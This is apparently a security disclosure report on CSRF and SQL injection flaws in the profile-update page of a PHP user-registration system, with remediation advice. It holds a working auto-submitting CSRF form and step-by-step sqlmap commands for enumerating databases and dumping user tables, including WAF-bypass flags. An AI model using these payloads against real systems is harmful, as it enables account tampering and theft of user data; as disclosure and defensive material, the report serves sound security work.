# Combined Vulnerability Report

**Generated:** 2025-10-04

This single-file report collects repository notes, two vulnerability write-ups (CSRF and SQL Injection in `fname`), PoCs, exploitation steps, and remediation guidance intended for authorized testing and reporting. Do not run any exploit code or sqlmap commands against systems for which you do not have explicit written permission.

---

## Repository Overview (short)
A collection of formatted vulnerability reports and PoCs for authorized security testing and tracking. Each vulnerability section below is self-contained and includes PoC, reproduction steps, and remediation.

---

# 1) Vulnerability: CSRF in Profile Update

## Vulnerability ID: 2025-10-04 - CSRF-Profile-Update (High)

### Impact
Cross-Site Request Forgery (CSRF) allows an attacker to make an authenticated user perform unwanted actions. Here, an attacker can change profile details (first name, last name, contact number) of an authenticated user, enabling impersonation, fraud, or interference with account recovery.

### Likelihood
High — The profile update endpoint accepts POST requests that modify user data without anti-CSRF tokens, SameSite protections, or reliable Origin/Referer validation.

### Risk Level
**High**

### Found In
`https://192.168.31.97/User-Registration-and-login-System-with-admin-panel/loginsystem/admin/edit-profile.php?uid=1`

### Vulnerability Description
Web applications must ensure state-changing requests are legitimately initiated by the user. However, during review it was found that `edit-profile.php` performs updates based on POST data without verifying an anti-CSRF token or validating request origin. Because the app accepts session cookies as sole authentication, a remote attacker can host a malicious page that auto-submits a crafted POST request; if an authenticated victim visits that page, their browser will send the request with their session cookie and the server will apply the update.

### PoC (HTML)
Host this page and lure an authenticated victim (admin/user) to visit it — the form auto-submits and updates `uid=1` profile fields.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://192.168.31.97/User-Registration-and-login-System-with-admin-panel/loginsystem/admin/edit-profile.php?uid=1" method="POST">
      <input type="hidden" name="fname" value="Rahul" />
      <input type="hidden" name="lname" value="Kumarrr" />
      <input type="hidden" name="contact" value="1111111111" />
      <input type="hidden" name="update" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Observed request sample:**

```
POST /User-Registration-and-login-System-with-admin-panel/loginsystem/admin/edit-profile.php?uid=1 HTTP/1.1
Host: 192.168.31.97
Cookie: PHPSESSID=7tnikfr1hvrh3p5sq2l0bi9rki
Content-Type: application/x-www-form-urlencoded
Origin: https://192.168.31.97
Referer: https://192.168.31.97/User-Registration-and-login-System-with-admin-panel/loginsystem/admin/edit-profile.php?uid=1

fname=Rahul&lname=Kumarrr&contact=1234567890&update=
```

**Observed response excerpt:**

```
HTTP/1.1 200 OK
<script>alert('Profile updated successfully');</script><script type='text/javascript'> document.location = 'manage-users.php'; </script>
```

### Initial Recommendations
- Implement server-side anti-CSRF tokens (synchronizer token pattern) for all state-changing forms and validate them.  
- Set session cookies with `SameSite=Lax` or `SameSite=Strict` where feasible.  
- Validate `Origin` and `Referer` for sensitive POST endpoints and reject mismatches.  
- Add confirmation/verification for sensitive profile changes (email/SMS).  

---

# 2) Vulnerability: SQL Injection in `fname` (Authenticated POST)

## Vulnerability ID: 2025-10-04 - SQLi-fname (High)

### Impact
SQL Injection allows attackers to inject SQL into queries, potentially leading to data disclosure, authentication bypass, data manipulation, or full database compromise. The `fname` POST parameter in the profile update function was found injectable and exploitable with `sqlmap` to enumerate databases and dump tables.

### Likelihood
High — The `fname` parameter is used in a backend query without parameterization or robust input validation. The endpoint responds in a way that permitted automated detection and exploitation.

### Risk Level
**High**

### Found In
`POST https://192.168.31.97/User-Registration-and-login-System-with-admin-panel/loginsystem/admin/edit-profile.php?uid=1`

### Vulnerability Description
Applications must avoid concatenating untrusted input into SQL queries and should use prepared statements. During testing it was found that `fname` is accepted and used in a query without parameterization. An attacker with a valid session (or a coerced victim) can supply SQL payloads to alter query logic, enabling enumeration and data extraction.

### Observed vulnerable request (captured)

```
POST /User-Registration-and-login-System-with-admin-panel/loginsystem/admin/edit-profile.php?uid=1 HTTP/1.1
Host: 192.168.31.97
Cookie: PHPSESSID=7tnikfr1hvrh3p5sq2l0bi9rki
Content-Type: application/x-www-form-urlencoded
Origin: https://192.168.31.97
Referer: https://192.168.31.97/User-Registration-and-login-System-with-admin-panel/loginsystem/admin/edit-profile.php?uid=1

fname=Rahul&lname=Kumarrr&contact=1234567890&update=
```

### Exploitation Process (PoC & sqlmap commands)

**Step 1 — Save the request to a file** (e.g., `req.txt`) using Burp or a raw HTTP capture.

**Step 2 — Confirm injection with sqlmap:**

```bash
sqlmap -r req.txt -p fname --batch --level=3 --risk=2
```

**Step 3 — Enumerate DBMS and databases:**

```bash
sqlmap -r req.txt -p fname --batch --dbs --banner
```

**Step 4 — List tables in a database:**

```bash
sqlmap -r req.txt -p fname --batch -D target_db --tables
```

**Step 5 — Dump a table (example: `users`):**

```bash
sqlmap -r req.txt -p fname --batch -D target_db -T users --columns
sqlmap -r req.txt -p fname --batch -D target_db -T users --dump
```

**Example one-liner (without request file):**

```bash
sqlmap -u "https://192.168.31.97/User-Registration-and-login-System-with-admin-panel/loginsystem/admin/edit-profile.php?uid=1" \
  --data="fname=Rahul&lname=Kumarrr&contact=1234567890&update=" \
  -p fname \
  --cookie="PHPSESSID=7tnikfr1hvrh3p5sq2l0bi9rki" \
  --batch --level=5 --risk=3 --dbs
```

**Common useful flags:**
- `--threads=4` — parallel requests.  
- `--technique=BEUSTQ` — restrict to specific injection techniques (Boolean, Error, Union, Stacked, Time, Query).  
- `--time-sec=10` — timeout for time-based payloads.  
- `--skip-waf` — attempt WAF bypasses (use with caution).

**Interpreting results:**
- `sqlmap` reports the injection type and recommended extraction methods. Dumped data may include sensitive fields (emails, hashed passwords). Treat dumped credentials as sensitive and follow your disclosure/response policy.

### Tools / Commands (single-line example)
```
sqlmap -r req.txt -p fname --batch --level=5 --risk=3 --cookie="PHPSESSID=7tnikfr1hvrh3p5sq2l0bi9rki" --dbs
```

### Initial Recommendations (SQLi)
- Use **prepared statements / parameterized queries** (PDO prepared statements or parameterized APIs) everywhere user input is used in SQL.  
- Apply **least privilege** on DB credentials used by the application. Web DB user should not have more privileges than necessary.  
- Conduct code review and fix all dynamic query construction. Use an ORM or parameterized query builder if possible.  
- Monitor and log suspicious queries or unusual volumes of queries. Implement anomaly detection for data exfiltration.  
- If data was exfiltrated (e.g., password hashes), trigger incident response: reset exposed credentials, notify affected users, rotate keys/secrets as necessary.

---

## Appendix: Remediation Checklist (quick)
- [ ] Add anti-CSRF tokens to all state-changing forms and validate server-side.  
- [ ] Validate `Origin`/`Referer` and set `SameSite` cookie attributes.  
- [ ] Replace concatenated SQL with prepared statements / parameterized queries.  
- [ ] Harden DB user privileges and rotate DB credentials if compromise suspected.  
- [ ] Add logging/monitoring and alerts for suspicious activity.  
- [ ] Update documentation and add tests to prevent regression.

---

## Legal & Safety
All PoCs and commands in this file are for authorized, ethical security testing only. Do not run exploits against systems you do not own or have explicit written permission to test. Follow your organization’s disclosure and incident response policies.

---

*End of combined report.*

